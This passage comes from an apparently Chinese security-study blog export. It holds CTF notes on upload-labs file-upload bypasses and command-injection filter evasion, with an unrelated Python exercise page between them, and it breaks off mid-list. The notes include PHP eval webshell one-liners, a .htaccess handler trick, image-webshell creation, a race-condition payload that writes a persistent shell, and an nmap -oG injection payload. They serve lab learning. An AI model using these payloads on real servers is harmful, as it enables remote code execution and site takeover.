<h2 id="Content-Type验证"><a href="#Content-Type验证" class="headerlink" title="Content-Type验证"></a>Content-Type验证</h2><p>  MediaType即是Internet Media Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。也就是说,每种类型的文件上传时,都会给他一个Content-Type值作为标识,但是这个也是用户可修改的</p>
<ol>
<li><strong>常见类型</strong>：<br>text&#x2F;html  HTML格式<br>text&#x2F;plain  纯文本格式<br>text&#x2F;xml   XML格式<br>image&#x2F;gif  gif图片格式<br>image&#x2F;jpeg  jpg图片格式<br>image&#x2F;png  png图片格式</li>
<li><strong>绕过方法</strong><ol>
<li>用抓包软件拦截,再将content-type类型修改为允许上传的类型,注意有两个content-type,注意不要改错</li>
<li>实际上只要我们上传的是允许上传的类型,就会自动为我们生成一个正确的content-type,只要参考前端验证3的方法即可</li>
</ol>
</li>
</ol>
<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>如果明确说明了不允许某类文件的上传,即为把这类文件设置为黑名单</p>
<h3 id="等价扩展名绕过"><a href="#等价扩展名绕过" class="headerlink" title="等价扩展名绕过"></a>等价扩展名绕过</h3><ol>
<li><p><strong>原理</strong><br>等价扩展名就是在更改后缀名的同时不改变文件性质,如果,没有对等价扩展名加以限制,可以绕过黑名单</p>
</li>
<li><p><strong>php的等价扩展名</strong><br>php2 php3 php4 phps phtml php5 phpt</p>
</li>
<li><p><strong>asp的等价扩展名</strong><br>asa, cer, cdx</p>
</li>
<li><p><strong>aspx的等价扩展名</strong><br>ashx, asmx, ascx</p>
</li>
<li><p><strong>jsp的等价扩展名</strong><br>jspx jspf</p>
</li>
</ol>
<h3 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h3><p><code>.htaccess</code>文件是超文本入口,可以实现改变文件扩展名等功能,只在当前目录和子目录生效<br><code>.htaccess</code>文件是用来修改Apache的配置的文件,如果和主配置文件有冲突的话,优先.htaccess配置</p>
<ol>
<li><code>.htaccess</code>文件代码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;                      </span><br><span class="line">SetHandler  application/x-httpd-php            </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

这段代码的功能是如果发现shell.jpg文件,就将它当做php代码来解析</li>
<li><strong>流程</strong><br>先将<code>.htaccess</code>文件上传,再将<code>.jpg</code>文件上传,然后找到<code>.jpg</code>的上传地址用蚁剑连接即可</li>
<li>有些题目会把MIME类型做限制,但没有限制<code>.htaccess</code>后缀,这时候可以通过修改Content-Type成功上传<br>如果<code>.htaccess</code>后缀也被加入黑名单,这个方法失效</li>
</ol>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>大小写绕过和sql注入原理的差不多,<strong>Windows对大小写不敏感</strong>,但如果源代码里有这个函数<code>strtolower()</code>(把接收到的都转为小写),则大小写绕过失效</p>
<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ol>
<li><strong>原理</strong>:<br>windos在存储时会自动去处空格,在后缀的首或尾部加入一个空格,如果网站没有过滤空格的话,可以成功上传</li>
<li><strong>注意</strong>:<br>浏览器有可能会自动过滤上传文件的空格,建议使用抓包软件在数据包中加入空格</li>
<li><code>trim()</code>函数的作用是首尾去除空格,有这个函数空格绕过失效</li>
</ol>
<h3 id="点绕过"><a href="#点绕过" class="headerlink" title=".点绕过"></a>.点绕过</h3><p>在Windows中,系统会自动忽略删除末尾的<code>.</code>,所以我们上传类似于<code>.php.</code>这样的文件也是可以生效的,但如果检测机制没有去删除这个<code>.</code>,那么就会把最后一个<code>.</code>后面当成后缀名,文件就可以成功上传(用抓包软件)</p>
<h3 id="复写-点绕过"><a href="#复写-点绕过" class="headerlink" title="复写.点绕过"></a>复写.点绕过</h3><ol>
<li><strong>原理</strong><br>原理和点绕过类似,但是源代码中加入了<code>deldot()</code>函数用来删除文件名末尾的点,这时候如果我们直接在<code>.</code>后面加上空格,他是会被忽略的,<code>.</code>还是会被删除</li>
<li><strong>方法</strong><br>如果我们写入两个点,中间加上空格<code>. .</code>这样一来,最后一个点会被删除,中间的空格不会被忽略,于是不认为前面一个点是末尾的点,实现点绕过.(用抓包软件)</li>
</ol>
<h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h3><ol>
<li><strong>原理</strong><br>php在Windows环境的时候,如果文件的后缀名后面有<code>::$DATA</code>,则会把后面的数据当做文件流处理,不会检测后缀名</li>
<li><strong>注意</strong><br><code>::$DATA</code>要想生效必须要在php+Windows环境,Windows保存文件时会去除后面<code>::$DATA</code>,所以在连接时找到的地址不含<code>::$DATA</code></li>
</ol>
<h3 id="复写后缀绕过"><a href="#复写后缀绕过" class="headerlink" title="复写后缀绕过"></a>复写后缀绕过</h3><ol>
<li><strong>原理</strong><br>和SQL注入里的复写绕过类似,源代码中有<code>str_ireplace(参1,参2,参3)</code>函数,可以将关键后缀替换为空,如果是替换为空,且只进行一次的话,则可以复写<code>pphphp</code>绕过</li>
</ol>
<h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><p>如果明确说明了只允许某类文件的上传,其他类型的文件都不允许上传,即为把这类文件设置为白名单,显然,白名单是要比黑名单安全性更高</p>
<h3 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="00截断绕过"></a>00截断绕过</h3><ol>
<li><p><strong>使用条件</strong>：</p>
<ol>
<li>php版本要小于5.3.4。</li>
<li>文件路径(sava_path)可控。</li>
<li>magic_quotes_gpc需要为关闭状态。</li>
</ol>
</li>
<li><p><strong>原理</strong><br>所谓的<code>00截断</code>指的就是<code>%00</code>和<code>0x00</code><br><code>%00</code>适用于GET传参,URL解码后是空字符NULL,解码成16进制也为0x00<br><code>0x00</code>适用于POST传参,解析后也是空字符NULL,0x代表16进制<br>当一个字符串中存在空字符的时候,再被解析的时候会导致空字符后面的字符被丢弃(类似于SQL语句中的注释符)</p>
</li>
<li><p><strong>流程</strong><br>上传文件时,把木马文件改成可以上传的类型,然后用抓包软件修改数据包<br>GET传参:在 sava_path的地方加上想要的文件名和后缀,最后加上%00<br>POST传参:在sava_path的地方加上想要的文件名和后缀,最后加上一个字符,在用Hxe(16进制1)找到最后这个字符将它修改为00</p>
</li>
</ol>
<p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230405093410.png" alt="最后效果"></p>
<h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><p>在upload-labs pass 14关开始,检测程序不仅仅是根据后缀来判断文件是否合法了,会根据文件内容来检测上传文件是否为一个真实的文件,这时候,我们可以试着上传一个图片马</p>
<ol>
<li><strong>概念</strong><br>图片马,即是携带了一句话木马的图片,外表是一个正常的图片,但是图片的编码中写入了一句话木马</li>
<li><strong>图片马的制作</strong><br>将图片文件和一句话木马php文件保存在同一文件夹下,在此文件夹的命令提示符下输入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy a.jpg/b+ shell.php/a c.jpg</span><br></pre></td></tr></table></figure>
a.jpg是一个正常的图片,shell.php是一句话木马,c.jpg是合成以后的图片马</li>
<li><strong>使用条件</strong><br>并非所有的情况下都可以使用图片马,在正常情况下,图片不会被解析为可执行文件,需要网站存在文件包含漏洞或文件解析漏洞才行,在upload-labs pass 14里并没有这个环境,可以在&#x2F;upload&#x2F;目录下创建一个include.php文件,里面写入<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;file&#x27;</span> ] ;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>webshell的获取</strong><br>需要访问的地址并非图片保存的地址,而是include.php(文件包含漏洞)的地址,并用GET传参将图片的地址传入<code>?file=图片地址</code>,再用蚁剑连接<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230405110808.png"></li>
<li><strong>解释一下文件包含漏洞的原理</strong><br>在php文件中include包含其他文件时,他本来想引用一个php文件,但是漏洞就是,他不会去识别是什么php文件,引用的文件都当做php来解析,解决了图片马不当做php解析的问题<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/a.jpg" alt="无马图"></li>
</ol>
<h3 id="getimagesize-图片马"><a href="#getimagesize-图片马" class="headerlink" title="getimagesize()-图片马"></a>getimagesize()-图片马</h3><p>getimagesize()函数将测定任何GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM或WBMP图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通HTML文件中<IMG>标记中的 height&#x2F;width 文本字符串。<br>如果无法读取图片信息,则会被认定为非真实图像,要绕过这个函数检测实际上和利用图片马上传即可</p>
<h3 id="exif-imagetype-图片马"><a href="#exif-imagetype-图片马" class="headerlink" title="exif_imagetype()-图片马"></a>exif_imagetype()-图片马</h3><p>exif_imagetype()读取一个图像的第一个字节并检查其后缀名。<br>返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启php_exif模块<br>如果无法读取图片信息,则会被认定为非真实图像,要绕过这个函数检测实际上和利用图片马上传即可</p>
<h3 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h3><ol>
<li><strong>二次渲染原理</strong><br>二次渲染就是根据用户上传的图片,重新生成一个新的图片,保存新的图片,删除原来上传的图片,比如根据用户上传的不同大小的图片,渲染成符合条件的大小固定的图片</li>
<li><strong>绕过原理</strong><br>在二次渲染中,图片有增加部分,有减少部分,有不变部分,有可能我们在图片中写入的木马会被渲染掉,所有我们先上传一张图片,再将上传后渲染过的图片保存下来,对比渲染前后的编码变化,将木马写在不变部分,再次上传图片,利用文件包含漏洞,即可获得WebShell</li>
<li><strong>注意</strong><br>这种方式适用于git格式,其他方式过于复杂,暂时不做了解,同时,也需要一个可以将木马以二进制形式写入图片的软件</li>
</ol>
<h2 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h2><ol>
<li><p><strong>原理</strong><br>有些网站的服务器会先将上传的文件保存下来,再进行后缀或文件内容的对比,如果符合条件,则对文件进行重命名,如果不符合,则会删除文件.<br>但文件的保存和删除还是有间隔的,如果我们能在删除之前访问网页,就可以成功执行上传代码<br>ps:php中<code>unlike()</code>是用于删除函数的,如果服务器是先重命名再判断,就无法找到提交的路径了</p>
</li>
<li><p><strong>保存一句话木马</strong><br>由原理可知,非法的文件在上传后会被删除,哪怕我们在用一句话木马在间隔中访问到了WebShell,之后还是会被删除,所以我们必须想办法使木马保存在服务器里<br>所以我们将一句话木马改为<br><code>&lt;?php fputs(fopen(&#39;shell2.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;aa&quot;])?&gt;&#39;); ?&gt;</code><br>解释:</p>
<ol>
<li><code>fputs(参1,参2,参3)</code>函数的作用是将参2(<code>&#39;&lt;?php @eval($_POST[&quot;aa&quot;])?&gt;&#39;</code>)的内容写进参1(<code>fopen(&#39;shell2.php&#39;,&#39;w&#39;)</code>)。参3可选,规定要了写入的最大字节数。</li>
<li><code>fopen(参1,参2)</code>这是一个<a href="http://shuimao.xyz/2023/03/18/PHP%E7%9A%84%E5%AD%A6%E4%B9%A02-0/#%E6%96%87%E4%BB%B6">之前学过的函数</a>,不过多解释,这里的作用是用来创建新文件,保存一句话木马</li>
</ol>
</li>
<li><p><strong>注意</strong><br>我们上传的文件会被删除,但只要我们访问到了网站,就会自动保存<code>shell2.php</code>,所以我们实际最终获取WebShell的地址是在<code>shell2.php</code>,这里注意上传文件名(<code>shell,php</code>)和文件内创建的文件(<code>shell2.php</code>)不能重名,不然无法创建</p>
</li>
<li><p><strong>Burp重放</strong><br>文件的保存和删除的间隔太短了,所以我们使用Burp抓包软件进行不停放包</p>
<ol>
<li>先上传文件,再将抓到的包发到<strong>intruder(攻击器)</strong></li>
<li>payload set中设置null payloads</li>
<li>payload选项选择无限重发(continue indefinitely)<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230406174916.png"></li>
</ol>
</li>
<li><p><strong>脚本访问</strong><br>手动刷新浏览器太慢了,写个python脚本来访问,输出访问成功,代表代码成功执行,再用蚁剑连接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;上传文件的地址&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;访问成功&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="条件竞争-图片马"><a href="#条件竞争-图片马" class="headerlink" title="条件竞争-图片马"></a>条件竞争-图片马</h3><ol>
<li><strong>文件解析漏洞</strong><br>中间件Apache(阿帕奇)解析漏洞主要是因为低版本Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别则继续向左看，直到碰到合法后缀才进行解析.图片中,<code>.7z</code>是无法被浏览器解析的,如<code>shell.php.7z</code>如果存在文件解析漏洞,则会被当成php文件解析</li>
<li><strong>原理</strong><br>如果文件是先进行了后缀或文件内容的审查,合法的文件才进行保存,最后进行重命名.这样一来就无法上传<code>.php</code>文件了,这时可以试着上传图片马,但是由前面可知,图片马需要用到文件包含或是文件解析漏洞,那么我们就要利用文件保存和重命名之间的时间差,访问还未被重命名的文件,这时因为文件解析漏洞的存在,就会把文件当成php来解析</li>
<li><strong>流程</strong><br>流程和前面的条件竞争没有什么区别,只是将上面的一句话木马写入图片,在用Burp重放,用python脚本访问</li>
</ol>
<h2 id="数组拼接漏洞"><a href="#数组拼接漏洞" class="headerlink" title="数组拼接漏洞"></a>数组拼接漏洞</h2><ol>
<li><strong>explode()函数</strong><br>会以一个字符串去分割另一个字符串，并将字符串分割后的结果存储成一个数组</li>
<li><strong>原理</strong><br>示例upload-labs pass 21,这关采用的是白名单后缀验证,将上传的文件根据<code>.</code>作为分隔符,切割的内容以数组的形式保存,然后将数组的第一项与第n-1项拼接(n为数组总元素个数),成为最后的文件名,如果我们上传时,指定第一项为<code>shell.php</code>,第二项为空,第三项为jpg,这样一来,进行检测时,会因为最后一项为jpg而绕过,最后拼接时,拼接的是第一项与第二项(3-1&#x3D;2),即为<code>shell.php+空</code>,为php文件</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>一句话木马</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>python练习题</title>
    <url>/2023/03/13/python%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    <content><![CDATA[<h2 id="斐波那契函数"><a href="#斐波那契函数" class="headerlink" title="斐波那契函数"></a>斐波那契函数</h2><p>在——上补充代码，输出100以内的斐波那契数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a,b=<span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a&lt;=<span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(a,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    ------</span><br></pre></td></tr></table></figure>
<p>答案：<br><code>a,b=b+a,a</code></p>
<p>试着思考相同结构能否用c语言实现</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0</span>,b=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(a&lt;=<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,a);</span><br><span class="line">        ------</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想了许久没有想出答案，在python的赋值中<code>a,b=b+a,a</code>,a和b的赋值是同时进行的，但是在c语言中似乎无法用同时赋值，必须引用一个新的变量</p>
<h2 id="jieba库"><a href="#jieba库" class="headerlink" title="jieba库"></a>jieba库</h2><p>常用函数jieba.lcut(s)   精确模式，返回一个列表类型。作用：分词,按中文逻辑切片</p>
<h2 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h2><p>把字符串形式的结果保留原本的东西，在进行正常的运算</p>
<h2 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h2><p>ord()参数是一个字符，不能是字符串，返回该字符对应的Unicode码<br>chr()的作用是：输入一个十进制或十六进制数字，返回其在Unicode编码中对应的文字或符号</p>
<h2 id="format格式化输出"><a href="#format格式化输出" class="headerlink" title="format格式化输出"></a>format格式化输出</h2><p>语法<code>print(&quot;&#123;参数&#125;&quot;.format(内容))</code><br>参数格式：冒填齐宽逗点类<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230313213146.png"></p>
<h2 id="列表切片：列表名-索引值-索引值-步长"><a href="#列表切片：列表名-索引值-索引值-步长" class="headerlink" title="列表切片：列表名[索引值:索引值:步长]"></a>列表切片：列表名[索引值:索引值:步长]</h2><p>索引值省略默认为起始值或终止值</p>
<h2 id="random库（随机）"><a href="#random库（随机）" class="headerlink" title="random库（随机）"></a>random库（随机）</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230313215009.png"></p>
<h2 id="len-函数"><a href="#len-函数" class="headerlink" title="len()函数"></a>len()函数</h2><p>计算字符长度<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230317151959.png"></p>
<h2 id="str-split-方法"><a href="#str-split-方法" class="headerlink" title="str.split()方法"></a>str.split()方法</h2><p>split(‘分割符’,num)   用指定分隔符对字符串切片，分割成num+1个字符串（切num刀）。<br>返回值是num+1个列表<br>可以省略，默认以空格全切</p>
<h2 id="pow-函数"><a href="#pow-函数" class="headerlink" title="pow()函数"></a>pow()函数</h2><p>pow(x,y,z)   x底数，y指数，z取余字数<br>只有xy的情况下返回值是x的y次方<br>有z的情况下返回值是pow(x,y)的结果对z求余</p>
<h2 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h2><p>print输出后自动换行<br>可以用print(,end&#x3D;’结尾符’)改变结尾</p>
<h2 id="complex-函数"><a href="#complex-函数" class="headerlink" title="complex()函数"></a>complex()函数</h2><p>complex是python中的复数类型，以类似5+6j的形式表达<br>complex函数用于创建一个复数或者将一个字符串转化为复数形式</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行的绕过技巧</title>
    <url>/2023/04/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>想要进行绕过的话,需要根据不同的系统的特性采用不同的方式,在ctf中还是以Linux居多</p>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言,Shell是系统的用户界面，提供了用户与内核进行交互操作的一种接口(命令解释器)</p>
<p>sh(全称 Bourne Shell): 是UNIX最初使用的 shell，而且在每种 UNIX 上都可以使用。Bourne Shell 在 shell 编程方面相当优秀，但在处理与用户的交互方面做得不如其他几种 shell。</p>
<p>bash（全称 Bourne Again Shell）: LinuxOS 默认的，它是 Bourne Shell 的扩展。与BourneShell 完全兼容，并且在 Bourne Shell 的基础上增加了很多特性。可以提供命令补全，命令编辑和命令历史等功能。它还包含了很多 C Shell 和 Korn Shell 中的优点，有灵活和强大的编辑接口，同时又很友好的用户界面。<br>我们常用(默认)的就是bash(bourne again shell)</p>
<h2 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h2><p>先来介绍一个概念叫做shell变量,shell变量是由shell程序设置的特殊变量,定义变量时，变量名不加美元符号<code>$</code>,使用变量时,需要加上美元符号<br>变量名外面的花括号是可选的.加花括号是为了帮助解释器识别变量的边界,如${IFS}</p>
<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ol>
<li><strong>IFS绕过</strong><br>原理:<code>$IFS</code>(Internal Filed Separator)内部域分隔符,是一个shell变量，默认是空格、Tab键、换行符,可以代替空格使用<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS   //这个一般用不了,因为空格过滤了的情况下,无法区分边界  </span><br><span class="line">$&#123;IFS&#125;   //花括号&#123;&#125;用于区分边界</span><br><span class="line">$IFS$1 //后面一个变量用于区分边界,$1改成$加其他数字貌似都行</span><br></pre></td></tr></table></figure></li>
<li><strong>其他绕过</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;   // cmd&lt;file 使cmd命令从file读入,cat的时候可以代替空格</span><br><span class="line">&lt;&gt;  // cmd&lt;&gt;file 以读写模式把文件file重定向到输入,cat的时候可以代替空格</span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h2><h3 id="内联执行-反引号"><a href="#内联执行-反引号" class="headerlink" title="内联执行(反引号)"></a>内联执行(反引号)</h3><ol>
<li><strong>原理</strong><br>此处的反引号是Linux命令里的反引号,和php危险函数里的不同,效果却差不多<br>反引号的功能是命令替换，在反引号(``)中的内容通常是可执行的命令，程序会优先执行反引号中的内容，并使用运行结果替换掉反引号处的内容。<br>例如:<strong>cat `ls`</strong>,会先执行ls查询,再将所有文件进行一个cat</li>
</ol>
<h2 id="变量替换"><a href="#变量替换" class="headerlink" title="变量替换"></a>变量替换</h2><ol>
<li><strong>原理</strong><br>这里的变量是shell变量,不是php的变量,利用命令的拼接,变量的拼接,达到关键词被替换的效果<br>例如:<code>a=g;cat fla$a.php</code> 或是<code>a=fl;b=ag;cat $a$b.php</code> &#x2F;&#x2F;变量定义的时候不加$,使用的时候加</li>
<li><strong>注意</strong><br>需要稍微注意的是,命令之间的连接符不能用<code>||</code>,因为一旦前面的命令为真后,后面的命令不再执行</li>
</ol>
<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ol>
<li><strong>原理</strong><br>利用Linux里的<code>base64</code>命令,可以进行base64的编码(<code>base64 -d</code>代表解码),先将关键字编码好,再利用管道符和<code>base64 -d</code>进行解码实现对关键字的绕过</li>
<li><strong>先讲编码</strong><br><code>echo  待编码字符 |base64</code> 或<code>base64 &lt;&lt;&lt; &quot;待编码字符”</code></li>
<li><strong>解码绕过(重点)</strong><br><code>echo 编码后字符 |base64 -d |bash(或是sh)</code><br>例子:<code>echo Y2F0IGZsYWcucGhw|base64 -d|bash</code>&#x3D;<code>cat flag.php</code><br>利用管道符将解码后的命令输入到bash(或sh),这样命令才会被识别成命令执行,不然只会输出解码后的字符串</li>
</ol>
<h2 id="其他的一些绕过"><a href="#其他的一些绕过" class="headerlink" title="其他的一些绕过"></a>其他的一些绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\   //反斜线</span><br><span class="line">&quot;&quot;   //空字符串</span><br><span class="line">&#x27;&#x27;  //空字符串</span><br><span class="line">适用于过滤不严格的情况,待补充</span><br></pre></td></tr></table></figure>
<p>例如 <code>ls</code>被过滤的情况下可以使用<code>l\s</code>,这个命令在linux中是可以被识别为<code>ls</code>的,但是如果过滤不严格的情况下就可以绕过过滤,类似的还有<code>l&#39;&#39;s</code>,<code>l&quot;&quot;s</code></p>
<h2 id="escapeshellarg-和escapeshellcmd"><a href="#escapeshellarg-和escapeshellcmd" class="headerlink" title="escapeshellarg()和escapeshellcmd()"></a>escapeshellarg()和escapeshellcmd()</h2><p>buuctf例题连接<a href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">[BUUCTF 2018]Online Tool</a></p>
<ol>
<li><strong>escapeshellarg()</strong><br>这个函数通过将输入的内容两端添加单引号包裹,这样以确保能够直接将一个字符串传入shell函数，使原本会被理解成参数选项的部分被理解成命令内容,确保不会参数参数注入漏洞<br>如果想通过输入单引号进行闭合也是不可行的,此函数会将单引号<code>&#39;</code>进行转义后再用单引号包裹<code>&#39;\&#39;&#39;</code><br>ps:参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。</li>
<li><strong>escapeshellcmd()</strong><br>会在这些字符(<code>&amp; # ; | * ? ~ &lt; &gt; ^ () [] &#123;&#125; $ \ , \x0A 和 \xFF 反引号 </code>)前添加反斜杠\进行转义,但单引号<code>&#39;</code>和双引号<code>&quot;</code>仅在不配对儿的时候被转义。在Windows平台上，所有这些字符加上 % 和 ! 字符都会被空格代替</li>
<li><strong>原理</strong><br>这两个函数都是用来转义用的，前者转义参数，后者转义命令 <code>escapeshellarg() -&gt; escapeshellcmd()</code>这样的流程来处理输入，会导致单引号配对错误,从而导致escapeshellarg()失效,参数参数注入漏洞<br>主要是因为第二个函数转义了第一个函数的反斜杠,贴一个别人的例子<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传入参数是：172.17.0.2&#x27; -v -d a=1</span><br><span class="line">首先经过escapeshellarg处理后变成了&#x27;172.17.0.2&#x27;\&#x27;&#x27; -v -d a=1&#x27;，</span><br><span class="line">即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">再经过escapeshellcmd处理后变成&#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，</span><br><span class="line">这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义</span><br><span class="line">最后执行的命令是curl &#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -da=1\&#x27;，</span><br><span class="line">由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。</span><br><span class="line">所以可以简化为curl 172.17.0.2\ -v -d a=1&#x27;，即向172.17.0.2\发起请求，POST 数据为a=1’。</span><br></pre></td></tr></table></figure></li>
<li><strong>nmap参数注入</strong><br>nmap有个危险参数<code>-oG</code>可以将代码与命令写到文件中，<br>比如<code>nmap &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG shell.php</code>，就是将一句话木马写在了shell.php里内了。</li>
<li><strong>注意</strong><br>在这题中一句话木马里的参数要用双引号<code>&quot;a&quot;</code>包裹,因为escapeshellarg()会对单引号进行转义导致问题.最后的payload为<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG shell.php &#x27;</span><br></pre></td></tr></table></figure>
注意有两个单引号,且中间有空格,不然转义后的反斜杠会导致文件名变成<code>php\</code></li>
</ol>
<h2 id="无字母getshell"><a href="#无字母getshell" class="headerlink" title="无字母getshell"></a>无字母getshell</h2><p>代码确实是限制了我们的 Webshell 不能出现任何字母和数字，但是并没有限制除了字母和数字以外的其他字符。所以我们的思路是，将非字母数字的字符经过各种转换，最后能构造出a-z0-9中的任意一个字符。然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，比如 “assert”、”system”、”file_put_contents”、”call_user_func” 等危险函数然后动态执行即可。<br>本质上就是对一下代码的绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230419162258.png" alt="菜鸟教程位运算"></p>
<h3 id="异或构造"><a href="#异或构造" class="headerlink" title="异或构造"></a>异或构造</h3><p>关键字符<code>^</code></p>
<ol>
